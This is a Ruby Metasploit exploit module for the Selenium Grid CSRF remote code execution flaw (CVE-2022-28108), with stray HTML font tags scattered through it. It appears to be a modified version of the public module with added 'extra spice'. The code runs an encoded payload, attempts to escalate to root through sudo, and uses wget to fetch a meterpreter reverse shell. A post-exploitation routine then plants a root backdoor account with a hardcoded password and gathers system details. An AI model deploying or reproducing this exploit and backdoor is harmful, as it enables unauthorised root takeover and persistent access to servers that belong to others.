##<font></font>
# This module requires Metasploit: https://metasploit.com/download<font></font>
# Current source: https://github.com/rapid7/metasploit-framework<font></font>
##<font></font>
<font></font>
class MetasploitModule < Msf::Exploit::Remote<font></font>
  Rank = ExcellentRanking<font></font>
<font></font>
  include Msf::Exploit::Remote::HttpClient<font></font>
  prepend Msf::Exploit::Remote::AutoCheck<font></font>
<font></font>
  def initialize(info = {})<font></font>
    super(<font></font>
      update_info(<font></font>
        info,<font></font>
        'Name' => 'Selenium chrome RCE with Extra Spice',<font></font>
        'Description' => %q{<font></font>
          Selenium Server (Grid) before 4.0.0-alpha-7 allows CSRF because it permits non-JSON content types<font></font>
          such as application/x-www-form-urlencoded, multipart/form-data, and text/plain.<font></font>
          This module includes additional features for persistence and post-exploitation, because why not?
        },<font></font>
        'Author' => [<font></font>
          'randomstuff (Gabriel Corona)', # Exploit development<font></font>
          'Wiz Research',                 # Vulnerability research<font></font>
          'Takahiro Yokoyama',             # Metasploit module<font></font>
          'ZeroEthical'                   # Extra "interesting" features
        ],<font></font>
        'License' => MSF_LICENSE,<font></font>
        'References' => [<font></font>
          ['CVE', '2022-28108'],<font></font>
          ['URL', 'https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps'],<font></font>
          ['URL', 'https://www.gabriel.urdhr.fr/2022/02/07/selenium-standalone-server-csrf-dns-rebinding-rce/'],<font></font>
        ],<font></font>
        'Payload' => {},<font></font>
        'Platform' => %w[linux],<font></font>
        'Targets' => [<font></font>
          [<font></font>
            'Linux Command with Extra Steps', {<font></font>
              'Arch' => [ ARCH_CMD ], 'Platform' => [ 'unix', 'linux' ], 'Type' => :nix_cmd,<font></font>
              'DefaultOptions' => {<font></font>
                # tested cmd/linux/http/x64/meterpreter_reverse_tcp<font></font>
                'FETCH_COMMAND' => 'WGET'<font></font>
              }<font></font>
            }<font></font>
          ],<font></font>
        ],<font></font>
        'DefaultOptions' => {<font></font>
          'FETCH_DELETE' => true<font></font>
        },<font></font>
        'DefaultTarget' => 0,<font></font>
        'DisclosureDate' => '2022-04-18',<font></font>
        'Notes' => {<font></font>
          'Stability' => [ CRASH_SAFE, ],<font></font>
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],<font></font>
          'Reliability' => [ REPEATABLE_SESSION, ]<font></font>
        }<font></font>
      )<font></font>
    )<font></font>
    register_options(<font></font>
      [<font></font>
        Opt::RPORT(4444),<font></font>
      ]<font></font>
    )<font></font>
  end<font></font>
<font></font>
  def check<font></font>
    # Request for Selenium Grid version 4<font></font>
    v4res = send_request_cgi({<font></font>
      'method' => 'GET',<font></font>
      'uri' => normalize_uri(target_uri.path, 'status')<font></font>
    })<font></font>
    return Exploit::CheckCode::Detected('Selenium Grid version 4.x detected.') if v4res && v4res.get_json_document &&<font></font>
                                                                                  v4res.get_json_document.include?('value') &&<font></font>
                                                                                  v4res.get_json_document['value'].include?('message') &&<font></font>
                                                                                  v4res.get_json_document['value']['message'].downcase.include?('selenium grid')<font></font>
<font></font>
    # Request for Selenium Grid version 3<font></font>
    v3res = send_request_cgi({<font></font>
      'method' => 'GET',<font></font>
      'uri' => normalize_uri(target_uri.path)<font></font>
    })<font></font>
    return Exploit::CheckCode::Unknown('Unexpected server reply.') unless v3res&.code == 200<font></font>
<font></font>
    js_code = v3res.get_html_document.css('script').find { |script| script.text.match(/var json = Object.freeze\('(.*?)'\);/) }<font></font>
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless js_code<font></font>
<font></font>
    json_str = js_code.text.match(/var json = Object.freeze\('(.*?)'\);/)[1]<font></font>
    begin<font></font>
      json_data = JSON.parse(json_str)<font></font>
    rescue JSON::ParserError<font></font>
      return Exploit::CheckCode::Unknown('Unable to determine the version.')<font></font>
    end<font></font>
    return Exploit::CheckCode::Unknown('Unable to determine the version.') unless json_data && json_data.include?('version') && json_data['version']<font></font>
<font></font>
    # Extract the version<font></font>
    version = Rex::Version.new(json_data['version'])<font></font>
    if version == Rex::Version.new('4.0.0-alpha-7') || Rex::Version.new('4.0.1') <= version<font></font>
      return Exploit::CheckCode::Safe("Version #{version} detected, which is not vulnerable.")<font></font>
    end<font></font>
<font></font>
    CheckCode::Appears("Version #{version} detected, which is vulnerable.")<font></font>
  end<font></font>
<font></font>
  def exploit<font></font>
    b64encoded_payload = Rex::Text.encode_base64(<font></font>
      "if sudo -n true 2>/dev/null; then\n"\<font></font>
      "  echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d | sudo su root -c /bin/bash\n"\<font></font>
      "else\n"\<font></font>
      "  #{payload.encoded}\n"\<font></font>
      "fi\n"<font></font>
    )<font></font>
<font></font>
    # Create the request body as a Ruby hash and then convert it to JSON<font></font>
    base_body = {<font></font>
      'capabilities' => {<font></font>
        'alwaysMatch' => {<font></font>
          'browserName' => 'chrome',<font></font>
          'goog:chromeOptions' => {<font></font>
            'binary' => '/usr/bin/python3',<font></font>
            'args' => ["-cimport base64,os; bp=b'#{b64encoded_payload}'; os.system(base64.b64decode(bp).decode())"]<font></font>
          }<font></font>
        }<font></font>
      }<font></font>
    }.to_json<font></font>
<font></font>
    # Try different content types for evasion (just a basic example)<font></font>
    content_types = ['text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data']<font></font>
<font></font>
    content_types.each do |content_type|<font></font>
      print_status("Trying Content-Type: #{content_type}")<font></font>
      res = send_request_cgi({<font></font>
        'method' => 'POST',<font></font>
        'uri' => normalize_uri(target_uri.path, 'wd/hub/session'),<font></font>
        'headers' => { 'Content-Type' => content_type },<font></font>
        'data' => base_body<font></font>
      })<font></font>
      if res && res.code == 200 && res.body.include?("sessionId")<font></font>
        print_good("Successfully exploited with Content-Type: #{content_type}")<font></font>
        # Now, let's add some "interesting" post-exploitation steps (basic examples)<font></font>
        execute_post_exploitation(res.body)<font></font>
        return<font></font>
      elsif res<font></font>
        print_error("Failed with Content-Type: #{content_type} - Response code: #{res.code}")<font></font>
      else<font></font>
        print_error("Failed with Content-Type: #{content_type} - No response")<font></font>
      end<font></font>
    end<font></font>
<font></font>
    fail_with(Failure::Unknown, 'Failed to exploit after trying different Content-Types.')<font></font>
  end<font></font>
<font></font>
  def execute_post_exploitation(session_response)<font></font>
    print_status("Starting post-exploitation steps...")<font></font>
<font></font>
    # Basic example of adding a backdoor user (VERY rudimentary, needs proper error handling, etc.)<font></font>
    add_backdoor_command = 'useradd -M -N -o -u 0 backdoor && echo "backdoor:P@$$wOrd" | chpasswd'<font></font>
    b64_backdoor = Rex::Text.encode_base64(add_backdoor_command)<font></font>
    execute_command_on_target("echo #{b64_backdoor} | base64 -d | bash")<font></font>
<font></font>
    # Example of trying to gather some system information (again, basic)<font></font>
    execute_command_on_target('whoami && id && uname -a')<font></font>
<font></font>
    print_good("Basic post-exploitation steps attempted. Check logs for details.")<font></font>
  end<font></font>
<font></font>
  def execute_command_on_target(command)<font></font>
    b64encoded_command = Rex::Text.encode_base64(command)<font></font>
    body = {<font></font>
      'capabilities' => {<font></font>
        'alwaysMatch' => {<font></font>
          'browserName' => 'chrome',<font></font>
          'goog:chromeOptions' => {<font></font>
            'binary' => '/bin/bash', # Or any other available command runner<font></font>
            'args' => ["-c", "echo #{b64encoded_command} | base64 -d | bash"]<font></font>
          }<font></font>
        }<font></font>
      }<font></font>
    }.to_json<font></font>
<font></font>
    res = send_request_cgi({<font></font>
      'method' => 'POST',<font></font>
      'uri' => normalize_uri(target_uri.path, 'wd/hub/session'), # You might need to reuse the existing session<font></font>
      'headers' => { 'Content-Type' => 'text/plain' },<font></font>
      'data' => body<font></font>
    })<font></font>
    if res && res.code == 200<font></font>
      print_good("Command executed: #{command}")<font></font>
    else<font></font>
      print_error("Failed to execute command: #{command}")<font></font>
    end<font></font>
  end<font></font>
<font></font>
end<font></font>
<font></font>
